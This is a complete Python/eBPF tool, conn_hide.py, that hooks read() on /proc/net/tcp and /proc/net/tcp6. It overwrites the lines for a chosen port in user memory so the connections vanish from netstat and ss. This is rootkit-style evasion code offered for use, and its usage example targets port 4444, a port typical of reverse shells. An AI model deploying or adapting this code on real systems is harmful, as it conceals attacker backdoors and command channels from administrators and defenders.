#!/usr/bin/env python3
"""
conn_hide.py - Hide network connections from /proc/net/tcp and /proc/net/tcp6.

Hooks sys_read via kretprobe. When a process reads from /proc/net/tcp or
/proc/net/tcp6, the return buffer is scanned for lines containing the target
port in hexadecimal format. Matching lines are zeroed out using
bpf_probe_write_user, making the connection invisible to netstat, ss, and
similar tools.

Requires: root, Linux kernel >= 4.7, bcc (python3-bpfcc)
"""

import argparse
import ctypes
import json
import os
import signal
import sys
import time

try:
    from bcc import BPF
except ImportError:
    print("Error: bcc library not found. Install python3-bpfcc or bcc-tools.", file=sys.stderr)
    sys.exit(1)


BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/fs_struct.h>

#define MAX_BUF_SIZE  4096
#define MAX_LINE_LEN  256
#define PORT_HEX_LEN  4
#define MAX_LINES     64

struct event_t {
    u32  pid;
    char comm[TASK_COMM_LEN];
    u16  hidden_port;
    u8   is_tcp6;
};

BPF_PERF_OUTPUT(events);

// Store the target port in hex (4 uppercase hex chars, null terminated)
BPF_ARRAY(target_port_hex, char[8], 1);

// Track read() syscall arguments: tid -> (fd, buf_ptr)
struct read_args_t {
    int  fd;
    u64  buf;
    u64  count;
};
BPF_HASH(active_reads, u32, struct read_args_t);

// Track which fds are /proc/net/tcp or tcp6: (pid, fd) -> is_tcp6
struct fd_key_t {
    u32 pid;
    int fd;
};
BPF_HASH(tcp_fds, struct fd_key_t, u8);

// Hook openat to detect when /proc/net/tcp or /proc/net/tcp6 is opened
TRACEPOINT_PROBE(syscalls, sys_exit_openat) {
    int fd = (int)args__ret;
    if (fd < 0)
        return 0;

    // We cannot reliably read the filename from the tracepoint args after
    // the syscall returns, so we use a different approach: we track all open
    // fds and check the dentry name from the file struct in the read hook.
    return 0;
}

// On sys_read entry, capture the arguments
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct read_args_t rargs = {};
    rargs.fd = (int)args__fd;
    rargs.buf = (u64)args__buf;
    rargs.count = (u64)args__count;
    active_reads.update(&tid, &rargs);
    return 0;
}

// On sys_read return, inspect the buffer if the fd belongs to /proc/net/tcp{,6}
TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    struct read_args_t *rargs = active_reads.lookup(&tid);
    if (!rargs) return 0;

    int ret = (int)args__ret;
    if (ret <= 0) {
        active_reads.delete(&tid);
        return 0;
    }

    u64 buf = rargs->buf;
    int fd = rargs->fd;
    active_reads.delete(&tid);

    // Determine if this fd points to /proc/net/tcp or /proc/net/tcp6
    // by reading the file's dentry name from the kernel.
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task) return 0;

    struct files_struct *files;
    bpf_probe_read_kernel(&files, sizeof(files), &task->files);
    if (!files) return 0;

    struct fdtable *fdt;
    bpf_probe_read_kernel(&fdt, sizeof(fdt), &files->fdt);
    if (!fdt) return 0;

    struct file **fd_array;
    bpf_probe_read_kernel(&fd_array, sizeof(fd_array), &fdt->fd);
    if (!fd_array) return 0;

    struct file *filp;
    bpf_probe_read_kernel(&filp, sizeof(filp), &fd_array[fd]);
    if (!filp) return 0;

    struct dentry *dentry;
    bpf_probe_read_kernel(&dentry, sizeof(dentry), &filp->f_path.dentry);
    if (!dentry) return 0;

    // Read the dentry name
    struct qstr d_name;
    bpf_probe_read_kernel(&d_name, sizeof(d_name), &dentry->d_name);

    char fname[8] = {};
    bpf_probe_read_kernel(fname, sizeof(fname), (void *)d_name.name);

    // Check if it is "tcp" or "tcp6"
    u8 is_tcp = 0;
    u8 is_tcp6 = 0;

    if (fname[0] == 't' && fname[1] == 'c' && fname[2] == 'p') {
        if (fname[3] == '\0')
            is_tcp = 1;
        else if (fname[3] == '6' && fname[4] == '\0')
            is_tcp6 = 1;
    }

    if (!is_tcp && !is_tcp6)
        return 0;

    // Get the target port hex string
    int zero = 0;
    char (*port_hex)[8] = target_port_hex.lookup(&zero);
    if (!port_hex) return 0;

    // Scan the buffer for lines containing the port.
    // /proc/net/tcp format has local_address as "IP:PORT" where PORT is 4 hex chars.
    // We search for ":XXXX" pattern where XXXX matches our target port.
    //
    // Strategy: read chunks of the buffer and look for the port hex string.
    // When found, zero out the entire line (from previous newline to next newline).

    if (ret > MAX_BUF_SIZE)
        ret = MAX_BUF_SIZE;

    char chunk[MAX_BUF_SIZE] = {};
    int read_len = ret;
    if (read_len > MAX_BUF_SIZE)
        read_len = MAX_BUF_SIZE;
    bpf_probe_read_user(chunk, read_len, (void *)buf);

    // Scan for ":XXXX " pattern (colon + 4 hex port chars + space)
    #pragma unroll
    for (int pos = 0; pos < MAX_BUF_SIZE - 6; pos++) {
        if (pos >= read_len - 5)
            break;

        if (chunk[pos] != ':')
            continue;

        // Check if the 4 characters after the colon match our port hex
        bool match = true;
        #pragma unroll
        for (int k = 0; k < 4; k++) {
            if (chunk[pos + 1 + k] != (*port_hex)[k]) {
                match = false;
                break;
            }
        }

        if (!match)
            continue;

        // Found a match. Find the start of this line (previous newline or start of buffer).
        int line_start = pos;
        #pragma unroll
        for (int b = 0; b < MAX_LINE_LEN; b++) {
            if (line_start <= 0) break;
            line_start--;
            if (chunk[line_start] == '\n') {
                line_start++;
                break;
            }
        }

        // Find the end of this line (next newline or end of buffer).
        int line_end = pos + 5;
        #pragma unroll
        for (int e = 0; e < MAX_LINE_LEN; e++) {
            if (line_end >= read_len) break;
            if (chunk[line_end] == '\n') break;
            line_end++;
        }

        // Zero out the line in the user-space buffer by writing spaces.
        // We write spaces instead of zeros so the line becomes blank but
        // doesn't break text parsing with null bytes.
        int line_len = line_end - line_start;
        if (line_len > 0 && line_len <= MAX_LINE_LEN) {
            char spaces[MAX_LINE_LEN] = {};
            #pragma unroll
            for (int s = 0; s < MAX_LINE_LEN; s++) {
                if (s >= line_len) break;
                spaces[s] = ' ';
            }
            // Preserve the newline at the end if present
            if (line_end < read_len && chunk[line_end] == '\n') {
                if (line_len < MAX_LINE_LEN)
                    spaces[line_len] = '\n';
            }
            bpf_probe_write_user((void *)(buf + line_start), spaces, line_len);
        }

        // Report the event
        struct event_t event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.is_tcp6 = is_tcp6;
        events.perf_submit(args, &event, sizeof(event));

        break; // one match per read is enough
    }

    return 0;
}
"""


class ConnHider:
    """Manages the eBPF program that hides network connections."""

    def __init__(self, port, json_output=False):
        self.port = port
        self.json_output = json_output
        self.running = True
        self.bpf = None
        self.hide_count = 0

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[conn_hide] {message}", flush=True)

    def _handle_event(self, cpu, data, size):
        """Process perf buffer events from the BPF program."""
        event = self.bpf["events"].event(data)
        self.hide_count += 1
        comm = event.comm.decode("utf-8", errors="replace")
        proto = "tcp6" if event.is_tcp6 else "tcp"
        self._log(
            f"Hidden port {self.port} ({proto}) from {comm} (pid={event.pid})",
            level="event",
            hidden_port=self.port,
            protocol=proto,
            accessor_pid=event.pid,
            accessor_comm=comm,
            count=self.hide_count,
        )

    def start(self):
        """Compile and attach the eBPF program, then poll for events."""
        if self.port < 1 or self.port > 65535:
            self._log(f"Invalid port number: {self.port} (must be 1-65535).", level="error")
            sys.exit(1)

        port_hex = format(self.port, "04X")
        self._log(
            f"Compiling eBPF program to hide connections on port {self.port} "
            f"(hex: {port_hex})..."
        )

        try:
            self.bpf = BPF(text=BPF_PROGRAM)
        except Exception as exc:
            self._log(f"Failed to compile/load eBPF program: {exc}", level="error")
            sys.exit(1)

        # Write the target port hex string into the BPF array map
        port_buf = ctypes.create_string_buffer(8)
        port_buf.value = port_hex.encode("ascii")
        self.bpf["target_port_hex"][ctypes.c_int(0)] = port_buf

        # Set up perf buffer
        self.bpf["events"].open_perf_buffer(self._handle_event)

        self._log(
            f"Connection hiding active for port {self.port}. "
            f"Connections on this port are invisible to netstat/ss.",
            level="info",
            target_port=self.port,
            port_hex=port_hex,
            status="active",
        )
        self._log("Press Ctrl+C to stop and restore visibility.")

        while self.running:
            try:
                self.bpf.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                break

    def stop(self):
        """Detach probes and clean up."""
        self.running = False
        if self.bpf is not None:
            self.bpf.cleanup()
        self._log(
            f"Detached eBPF probes. Port {self.port} connections are visible again. "
            f"Total hide events: {self.hide_count}",
            level="info",
            target_port=self.port,
            total_hidden=self.hide_count,
            status="stopped",
        )


def main():
    parser = argparse.ArgumentParser(
        description="Hide network connections on a specific port from /proc/net/tcp{,6}. "
        "Makes the port invisible to netstat, ss, and similar tools.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 conn_hide.py --port 4444\n"
            "  sudo python3 conn_hide.py --port 8080 --json-output\n"
        ),
    )
    parser.add_argument(
        "--port",
        type=int,
        required=True,
        help="TCP port number to hide (1-65535).",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print(
            "Error: This script must be run as root (eBPF requires CAP_SYS_ADMIN).",
            file=sys.stderr,
        )
        sys.exit(1)

    hider = ConnHider(port=args.port, json_output=args.json_output)

    def signal_handler(signum, frame):
        hider.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        hider.start()
    except SystemExit:
        raise
    except Exception as exc:
        hider._log(f"Unexpected error: {exc}", level="error")
        hider.stop()
        sys.exit(1)
    finally:
        hider.stop()


if __name__ == "__main__":
    main()
